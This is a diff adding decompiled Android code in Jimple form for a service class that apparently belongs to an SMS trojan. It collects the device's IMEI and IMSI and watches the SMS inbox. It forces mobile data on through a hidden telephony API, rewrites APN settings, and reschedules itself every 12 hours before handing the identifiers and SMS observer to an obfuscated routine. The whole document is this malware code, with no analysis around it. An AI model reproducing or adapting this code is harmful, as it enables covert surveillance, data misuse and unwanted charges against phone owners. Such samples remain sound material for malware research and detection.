@@ -1,0 +1,417 @@
+public class com.xxx.yyy.MyService extends android.app.Service
+{
+    private static final java.lang.String COLUMN_APN_ID;
+    private static final android.net.Uri PREFERRED_APN;
+    private static final java.lang.String TAG;
+    private static final int sleephour;
+    private static final int sleeptime;
+    android.app.AlarmManager alarms;
+    java.lang.String currentid;
+    java.lang.String imei;
+    java.lang.String imsi;
+    int iswap;
+    android.app.PendingIntent pendingIntent;
+    com.xxx.yyy.SMSObserver smsObserver;
+    android.net.Uri uri;
+
+    static void <clinit>()
+    {
+        android.net.Uri $r0;
+
+        $r0 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://telephony/carriers/preferapn");
+        <com.xxx.yyy.MyService: android.net.Uri PREFERRED_APN> = $r0;
+        return;
+    }
+
+    public void <init>()
+    {
+        com.xxx.yyy.MyService r0;
+        android.net.Uri $r1;
+
+        r0 := @this: com.xxx.yyy.MyService;
+        specialinvoke r0.<android.app.Service: void <init>()>();
+        r0.<com.xxx.yyy.MyService: com.xxx.yyy.SMSObserver smsObserver> = null;
+        $r1 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://telephony/carriers/current");
+        r0.<com.xxx.yyy.MyService: android.net.Uri uri> = $r1;
+        r0.<com.xxx.yyy.MyService: java.lang.String currentid> = "0";
+        return;
+    }
+
+    private java.util.List getAPNList()
+    {
+        com.xxx.yyy.MyService r0;
+        java.lang.String[] r1;
+        com.xxx.yyy.MyService$APN r2;
+        android.content.ContentResolver $r3;
+        android.net.Uri $r4;
+        android.database.Cursor r5;
+        java.util.ArrayList r6;
+        boolean $z0;
+        int $i0, $i1, $i2;
+        java.lang.String $r7, $r8, $r9;
+
+        r0 := @this: com.xxx.yyy.MyService;
+        r1 = newarray (java.lang.String)[1];
+        r1[0] = "_id,apn,type,current";
+        $r3 = virtualinvoke r0.<com.xxx.yyy.MyService: android.content.ContentResolver getContentResolver()>();
+        $r4 = r0.<com.xxx.yyy.MyService: android.net.Uri uri>;
+        r5 = virtualinvoke $r3.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r4, r1, null, null, null);
+        r6 = new java.util.ArrayList;
+        specialinvoke r6.<java.util.ArrayList: void <init>()>();
+
+     label0:
+        if r5 == null goto label1;
+
+        $z0 = interfaceinvoke r5.<android.database.Cursor: boolean moveToNext()>();
+        if $z0 != 0 goto label3;
+
+     label1:
+        if r5 == null goto label2;
+
+        interfaceinvoke r5.<android.database.Cursor: void close()>();
+
+     label2:
+        return r6;
+
+     label3:
+        r2 = new com.xxx.yyy.MyService$APN;
+        specialinvoke r2.<com.xxx.yyy.MyService$APN: void <init>()>();
+        $i0 = interfaceinvoke r5.<android.database.Cursor: int getColumnIndex(java.lang.String)>("_id");
+        $r7 = interfaceinvoke r5.<android.database.Cursor: java.lang.String getString(int)>($i0);
+        r2.<com.xxx.yyy.MyService$APN: java.lang.String id> = $r7;
+        $i1 = interfaceinvoke r5.<android.database.Cursor: int getColumnIndex(java.lang.String)>("apn");
+        $r8 = interfaceinvoke r5.<android.database.Cursor: java.lang.String getString(int)>($i1);
+        r2.<com.xxx.yyy.MyService$APN: java.lang.String apn> = $r8;
+        $i2 = interfaceinvoke r5.<android.database.Cursor: int getColumnIndex(java.lang.String)>("type");
+        $r9 = interfaceinvoke r5.<android.database.Cursor: java.lang.String getString(int)>($i2);
+        r2.<com.xxx.yyy.MyService$APN: java.lang.String type> = $r9;
+        interfaceinvoke r6.<java.util.List: boolean add(java.lang.Object)>(r2);
+        goto label0;
+    }
+
+    protected static java.lang.Object getITelephony(android.content.Context) throws java.lang.SecurityException, java.lang.NoSuchMethodException, java.lang.IllegalArgumentException, java.lang.reflect.InvocationTargetException, java.lang.IllegalAccessException
+    {
+        android.content.Context r0;
+        java.lang.reflect.Method r1;
+        java.lang.Object $r2, $r7;
+        android.telephony.TelephonyManager r3;
+        java.lang.Class $r4;
+        java.lang.Class[] $r5;
+        boolean $z0;
+        java.lang.Object[] $r6;
+
+        r0 := @parameter0: android.content.Context;
+        $r2 = virtualinvoke r0.<android.content.Context: java.lang.Object getSystemService(java.lang.String)>("phone");
+        r3 = (android.telephony.TelephonyManager) $r2;
+        $r4 = virtualinvoke r3.<java.lang.Object: java.lang.Class getClass()>();
+        $r5 = newarray (java.lang.Class)[0];
+        r1 = virtualinvoke $r4.<java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])>("getITelephony", $r5);
+        $z0 = virtualinvoke r1.<java.lang.reflect.Method: boolean isAccessible()>();
+        if $z0 != 0 goto label0;
+
+        virtualinvoke r1.<java.lang.reflect.Method: void setAccessible(boolean)>(1);
+
+     label0:
+        $r6 = newarray (java.lang.Object)[0];
+        $r7 = virtualinvoke r1.<java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>(r3, $r6);
+        return $r7;
+    }
+
+    public static void setMobileDataState(android.content.Context, boolean)
+    {
+        android.content.Context r0;
+        boolean z0;
+        java.lang.Class r1;
+        java.lang.Object r2;
+        java.lang.String r3;
+        java.lang.Class[] $r4;
+        java.lang.reflect.Method $r5;
+        java.lang.Object[] $r6;
+        java.lang.Exception $r8, r9;
+
+        r0 := @parameter0: android.content.Context;
+        z0 := @parameter1: boolean;
+
+     label0:
+        r2 = staticinvoke <com.xxx.yyy.MyService: java.lang.Object getITelephony(android.content.Context)>(r0);
+        r1 = virtualinvoke r2.<java.lang.Object: java.lang.Class getClass()>();
+
+     label1:
+        if z0 == 0 goto label4;
+
+        r3 = "enableDataConnectivity";
+
+     label2:
+        $r4 = newarray (java.lang.Class)[0];
+        $r5 = virtualinvoke r1.<java.lang.Class: java.lang.reflect.Method getMethod(java.lang.String,java.lang.Class[])>(r3, $r4);
+        $r6 = newarray (java.lang.Object)[0];
+        virtualinvoke $r5.<java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>(r2, $r6);
+
+     label3:
+        return;
+
+     label4:
+        r3 = "disableDataConnectivity";
+        goto label2;
+
+     label5:
+        $r8 := @caughtexception;
+        r9 = $r8;
+        return;
+
+        catch java.lang.Exception from label0 to label1 with label5;
+        catch java.lang.Exception from label2 to label3 with label5;
+    }
+
+    public android.os.IBinder onBind(android.content.Intent)
+    {
+        com.xxx.yyy.MyService r0;
+        android.content.Intent r1;
+
+        r0 := @this: com.xxx.yyy.MyService;
+        r1 := @parameter0: android.content.Intent;
+        return null;
+    }
+
+    public void onCreate()
+    {
+        com.xxx.yyy.MyService r0;
+        java.lang.String r1, $r4, $r5, $r6;
+        java.lang.Object $r2, $r7;
+        android.telephony.TelephonyManager $r3;
+        android.app.AlarmManager $r8, $r11;
+        android.content.Intent $r9;
+        android.app.PendingIntent $r10, $r12;
+        com.xxx.yyy.SMSObserver $r13, $r14, $r18;
+        android.os.Handler $r15;
+        android.content.ContentResolver $r16;
+        android.net.Uri $r17;
+
+        r0 := @this: com.xxx.yyy.MyService;
+        $r2 = virtualinvoke r0.<com.xxx.yyy.MyService: java.lang.Object getSystemService(java.lang.String)>("phone");
+        $r3 = (android.telephony.TelephonyManager) $r2;
+        r1 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>();
+        r0.<com.xxx.yyy.MyService: java.lang.String imei> = r1;
+        $r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getSubscriberId()>();
+        r0.<com.xxx.yyy.MyService: java.lang.String imsi> = $r4;
+        $r5 = r0.<com.xxx.yyy.MyService: java.lang.String imsi>;
+        if $r5 != null goto label0;
+
+        r0.<com.xxx.yyy.MyService: java.lang.String imsi> = "";
+
+     label0:
+        $r6 = r0.<com.xxx.yyy.MyService: java.lang.String imei>;
+        if $r6 != null goto label1;
+
+        r0.<com.xxx.yyy.MyService: java.lang.String imei> = "";
+
+     label1:
+        $r7 = virtualinvoke r0.<com.xxx.yyy.MyService: java.lang.Object getSystemService(java.lang.String)>("alarm");
+        $r8 = (android.app.AlarmManager) $r7;
+        r0.<com.xxx.yyy.MyService: android.app.AlarmManager alarms> = $r8;
+        $r9 = new android.content.Intent;
+        specialinvoke $r9.<android.content.Intent: void <init>(java.lang.String)>("com.lz.myservicestart");
+        $r10 = staticinvoke <android.app.PendingIntent: android.app.PendingIntent getBroadcast(android.content.Context,int,android.content.Intent,int)>(r0, 0, $r9, 0);
+        r0.<com.xxx.yyy.MyService: android.app.PendingIntent pendingIntent> = $r10;
+        $r11 = r0.<com.xxx.yyy.MyService: android.app.AlarmManager alarms>;
+        $r12 = r0.<com.xxx.yyy.MyService: android.app.PendingIntent pendingIntent>;
+        virtualinvoke $r11.<android.app.AlarmManager: void set(int,long,android.app.PendingIntent)>(2, 43200000L, $r12);
+        $r13 = r0.<com.xxx.yyy.MyService: com.xxx.yyy.SMSObserver smsObserver>;
+        if $r13 != null goto label2;
+
+        $r14 = new com.xxx.yyy.SMSObserver;
+        $r15 = new android.os.Handler;
+        specialinvoke $r15.<android.os.Handler: void <init>()>();
+        specialinvoke $r14.<com.xxx.yyy.SMSObserver: void <init>(android.os.Handler,android.content.Context)>($r15, r0);
+        r0.<com.xxx.yyy.MyService: com.xxx.yyy.SMSObserver smsObserver> = $r14;
+        $r16 = virtualinvoke r0.<com.xxx.yyy.MyService: android.content.ContentResolver getContentResolver()>();
+        $r17 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://sms/");
+        $r18 = r0.<com.xxx.yyy.MyService: com.xxx.yyy.SMSObserver smsObserver>;
+        virtualinvoke $r16.<android.content.ContentResolver: void registerContentObserver(android.net.Uri,boolean,android.database.ContentObserver)>($r17, 1, $r18);
+
+     label2:
+        return;
+    }
+
+    public void onDestroy()
+    {
+        com.xxx.yyy.MyService r0;
+
+        r0 := @this: com.xxx.yyy.MyService;
+        return;
+    }
+
+    public void onStart(android.content.Intent, int)
+    {
+        com.xxx.yyy.MyService r0;
+        android.content.Intent r1;
+        int i0, $i5, $i6, $i13;
+        long $l1, l2, $l3, l4, l7, $l8, $l9, $l10, $l12, $l14, l15;
+        java.lang.Object $r2;
+        android.net.ConnectivityManager $r3;
+        android.net.NetworkInfo r4;
+        android.app.AlarmManager $r5, $r7, $r21;
+        android.app.PendingIntent $r6, $r8, $r22;
+        boolean $z0, $z1;
+        java.lang.String r9, r10, $r11, $r18, $r19;
+        android.content.SharedPreferences r12;
+        java.util.Date $r13, r14;
+        byte $b11;
+        android.content.SharedPreferences$Editor $r15, $r16;
+        com.xxx.yyy.qzl $r17;
+        com.xxx.yyy.SMSObserver $r20;
+
+        r0 := @this: com.xxx.yyy.MyService;
+        r1 := @parameter0: android.content.Intent;
+        i0 := @parameter1: int;
+        $r2 = virtualinvoke r0.<com.xxx.yyy.MyService: java.lang.Object getSystemService(java.lang.String)>("connectivity");
+        $r3 = (android.net.ConnectivityManager) $r2;
+        r4 = virtualinvoke $r3.<android.net.ConnectivityManager: android.net.NetworkInfo getActiveNetworkInfo()>();
+        if r4 != null goto label0;
+
+        virtualinvoke r0.<com.xxx.yyy.MyService: void openAPN()>();
+        staticinvoke <com.xxx.yyy.MyService: void setMobileDataState(android.content.Context,boolean)>(r0, 1);
+        $l1 = staticinvoke <android.os.SystemClock: long elapsedRealtime()>();
+        l2 = 600000L + $l1;
+        $r5 = r0.<com.xxx.yyy.MyService: android.app.AlarmManager alarms>;
+        $r6 = r0.<com.xxx.yyy.MyService: android.app.PendingIntent pendingIntent>;
+        virtualinvoke $r5.<android.app.AlarmManager: void set(int,long,android.app.PendingIntent)>(2, l2, $r6);
+        return;
+
+     label0:
+        $z0 = virtualinvoke r4.<android.net.NetworkInfo: boolean isAvailable()>();
+        if $z0 != 0 goto label1;
+
+        virtualinvoke r0.<com.xxx.yyy.MyService: void openAPN()>();
+        staticinvoke <com.xxx.yyy.MyService: void setMobileDataState(android.content.Context,boolean)>(r0, 1);
+        $l3 = staticinvoke <android.os.SystemClock: long elapsedRealtime()>();
+        l4 = 600000L + $l3;
+        $r7 = r0.<com.xxx.yyy.MyService: android.app.AlarmManager alarms>;
+        $r8 = r0.<com.xxx.yyy.MyService: android.app.PendingIntent pendingIntent>;
+        virtualinvoke $r7.<android.app.AlarmManager: void set(int,long,android.app.PendingIntent)>(2, l4, $r8);
+        return;
+
+     label1:
+        r9 = virtualinvoke r4.<android.net.NetworkInfo: java.lang.String getExtraInfo()>();
+        r0.<com.xxx.yyy.MyService: int iswap> = 1;
+        if r9 == null goto label3;
+
+        $i5 = virtualinvoke r9.<java.lang.String: int compareToIgnoreCase(java.lang.String)>("CMWAP");
+        if $i5 == 0 goto label2;
+
+        $i6 = virtualinvoke r9.<java.lang.String: int compareToIgnoreCase(java.lang.String)>("UNIWAP");
+        if $i6 != 0 goto label3;
+
+     label2:
+        r0.<com.xxx.yyy.MyService: int iswap> = 0;
+
+     label3:
+        r10 = virtualinvoke r4.<android.net.NetworkInfo: java.lang.String getTypeName()>();
+        if r10 == null goto label4;
+
+        $r11 = virtualinvoke r10.<java.lang.String: java.lang.String toLowerCase()>();
+        $z1 = virtualinvoke $r11.<java.lang.String: boolean contentEquals(java.lang.CharSequence)>("wifi");
+        if $z1 == 0 goto label4;
+
+        r0.<com.xxx.yyy.MyService: int iswap> = 2;
+
+     label4:
+        r12 = virtualinvoke r0.<com.xxx.yyy.MyService: android.content.SharedPreferences getSharedPreferences(java.lang.String,int)>("update_flag", 0);
+        $r13 = new java.util.Date;
+        specialinvoke $r13.<java.util.Date: void <init>()>();
+        l7 = interfaceinvoke r12.<android.content.SharedPreferences: long getLong(java.lang.String,long)>("oldtime", 0L);
+        r14 = new java.util.Date;
+        specialinvoke r14.<java.util.Date: void <init>()>();
+        $l8 = virtualinvoke r14.<java.util.Date: long getTime()>();
+        $l9 = $l8 - l7;
+        $l10 = $l9 / 3600000L;
+        $b11 = $l10 cmp 11L;
+        if $b11 <= 0 goto label5;
+
+        $r15 = interfaceinvoke r12.<android.content.SharedPreferences: android.content.SharedPreferences$Editor edit()>();
+        $l12 = virtualinvoke r14.<java.util.Date: long getTime()>();
+        $r16 = interfaceinvoke $r15.<android.content.SharedPreferences$Editor: android.content.SharedPreferences$Editor putLong(java.lang.String,long)>("oldtime", $l12);
+        interfaceinvoke $r16.<android.content.SharedPreferences$Editor: boolean commit()>();
+        $r17 = new com.xxx.yyy.qzl;
+        $r18 = r0.<com.xxx.yyy.MyService: java.lang.String imsi>;
+        $r19 = r0.<com.xxx.yyy.MyService: java.lang.String imei>;
+        $i13 = r0.<com.xxx.yyy.MyService: int iswap>;
+        $r20 = r0.<com.xxx.yyy.MyService: com.xxx.yyy.SMSObserver smsObserver>;
+        specialinvoke $r17.<com.xxx.yyy.qzl: void <init>(android.content.Context,java.lang.String,java.lang.String,int,com.xxx.yyy.SMSObserver)>(r0, $r18, $r19, $i13, $r20);
+        virtualinvoke $r17.<com.xxx.yyy.qzl: void GG()>();
+
+     label5:
+        $l14 = staticinvoke <android.os.SystemClock: long elapsedRealtime()>();
+        l15 = 43200000L + $l14;
+        $r21 = r0.<com.xxx.yyy.MyService: android.app.AlarmManager alarms>;
+        $r22 = r0.<com.xxx.yyy.MyService: android.app.PendingIntent pendingIntent>;
+        virtualinvoke $r21.<android.app.AlarmManager: void set(int,long,android.app.PendingIntent)>(2, l15, $r22);
+        return;
+    }
+
+    public void openAPN()
+    {
+        com.xxx.yyy.MyService r0;
+        java.util.Iterator r1;
+        android.content.ContentValues r2, r3;
+        java.util.List $r4;
+        boolean $z0;
+        android.content.ContentResolver $r5, $r8, $r20;
+        android.net.Uri $r6, $r9, $r21;
+        java.lang.String $r7, $r12, $r13, $r14, $r15, $r16, $r17, $r18, $r19, $r23;
+        java.lang.Object $r10;
+        com.xxx.yyy.MyService$APN r11;
+        int $i2;
+        java.lang.String[] $r22;
+
+        r0 := @this: com.xxx.yyy.MyService;
+        $r4 = specialinvoke r0.<com.xxx.yyy.MyService: java.util.List getAPNList()>();
+        r1 = interfaceinvoke $r4.<java.util.List: java.util.Iterator iterator()>();
+
+     label0:
+        $z0 = interfaceinvoke r1.<java.util.Iterator: boolean hasNext()>();
+        if $z0 != 0 goto label1;
+
+        r2 = new android.content.ContentValues;
+        specialinvoke r2.<android.content.ContentValues: void <init>()>();
+        virtualinvoke r2.<android.content.ContentValues: void putNull(java.lang.String)>("apn_id");
+        $r5 = virtualinvoke r0.<com.xxx.yyy.MyService: android.content.ContentResolver getContentResolver()>();
+        $r6 = <com.xxx.yyy.MyService: android.net.Uri PREFERRED_APN>;
+        virtualinvoke $r5.<android.content.ContentResolver: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>($r6, r2, null, null);
+        $r7 = r0.<com.xxx.yyy.MyService: java.lang.String currentid>;
+        virtualinvoke r2.<android.content.ContentValues: void put(java.lang.String,java.lang.String)>("apn_id", $r7);
+        $r8 = virtualinvoke r0.<com.xxx.yyy.MyService: android.content.ContentResolver getContentResolver()>();
+        $r9 = <com.xxx.yyy.MyService: android.net.Uri PREFERRED_APN>;
+        virtualinvoke $r8.<android.content.ContentResolver: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>($r9, r2, null, null);
+        return;
+
+     label1:
+        $r10 = interfaceinvoke r1.<java.util.Iterator: java.lang.Object next()>();
+        r11 = (com.xxx.yyy.MyService$APN) $r10;
+        r3 = new android.content.ContentValues;
+        specialinvoke r3.<android.content.ContentValues: void <init>()>();
+        $r12 = r11.<com.xxx.yyy.MyService$APN: java.lang.String apn>;
+        $r13 = staticinvoke <com.xxx.yyy.APNMatchTools: java.lang.String matchAPN(java.lang.String)>($r12);
+        virtualinvoke r3.<android.content.ContentValues: void put(java.lang.String,java.lang.String)>("apn", $r13);
+        $r14 = r11.<com.xxx.yyy.MyService$APN: java.lang.String type>;
+        $r15 = staticinvoke <com.xxx.yyy.APNMatchTools: java.lang.String matchAPN(java.lang.String)>($r14);
+        virtualinvoke r3.<android.content.ContentValues: void put(java.lang.String,java.lang.String)>("type", $r15);
+        $r16 = r11.<com.xxx.yyy.MyService$APN: java.lang.String type>;
+        $r17 = staticinvoke <com.xxx.yyy.APNMatchTools: java.lang.String matchAPN(java.lang.String)>($r16);
+        $r18 = virtualinvoke $r17.<java.lang.String: java.lang.String toLowerCase()>();
+        $i2 = virtualinvoke $r18.<java.lang.String: int compareTo(java.lang.String)>("default");
+        if $i2 != 0 goto label2;
+
+        $r19 = r11.<com.xxx.yyy.MyService$APN: java.lang.String id>;
+        r0.<com.xxx.yyy.MyService: java.lang.String currentid> = $r19;
+
+     label2:
+        $r20 = virtualinvoke r0.<com.xxx.yyy.MyService: android.content.ContentResolver getContentResolver()>();
+        $r21 = r0.<com.xxx.yyy.MyService: android.net.Uri uri>;
+        $r22 = newarray (java.lang.String)[1];
+        $r23 = r11.<com.xxx.yyy.MyService$APN: java.lang.String id>;
+        $r22[0] = $r23;
+        virtualinvoke $r20.<android.content.ContentResolver: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>($r21, r3, "_id=?", $r22);
+        goto label0;
+    }
+}
